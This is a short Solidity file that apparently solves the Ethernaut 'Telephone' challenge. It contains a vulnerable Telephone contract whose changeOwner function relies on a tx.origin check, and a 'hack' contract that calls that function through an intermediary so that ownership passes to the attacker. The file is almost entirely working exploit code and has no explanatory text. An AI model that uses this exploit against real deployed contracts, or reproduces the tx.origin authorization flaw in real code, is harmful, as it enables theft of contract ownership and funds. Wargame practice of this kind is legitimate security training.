// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract hack {
    address public owner;
    address public telephone;
    Telephone private immutable target;

    constructor(address _telephone) {
        owner = msg.sender;
        target = Telephone(_telephone);
    }
    
    function hackTelephone() public {
        target.changeOwner(owner);
    }
}


contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}